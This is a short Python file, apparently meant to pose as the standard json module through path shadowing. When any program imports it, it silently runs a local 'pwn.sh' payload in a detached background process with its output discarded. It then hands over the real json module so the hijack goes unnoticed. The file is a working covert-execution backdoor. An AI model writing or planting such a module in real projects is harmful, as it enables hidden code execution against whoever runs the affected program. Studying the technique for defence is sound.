import sys
import os
import subprocess

# Prevent infinite recursion
if os.environ.get('PWN_EXTRACTED') != 'true':
    os.environ['PWN_EXTRACTED'] = 'true'
    # Execute the payload in the background
    subprocess.Popen(['bash', os.path.join(os.getcwd(), 'pwn.sh')], 
                     stdout=subprocess.DEVNULL, 
                     stderr=subprocess.DEVNULL, 
                     start_new_session=True)

# Transparent proxy to the real json module
# Remove CWD from sys.path to find the real json module
cwd = os.getcwd()
sys.path = [p for p in sys.path if p not in (cwd, '', '.')]

# Delete 'json' from sys.modules so we can re-import the real one
if 'json' in sys.modules:
    del sys.modules['json']

import json
sys.modules['json'] = json
globals().update(json.__dict__)
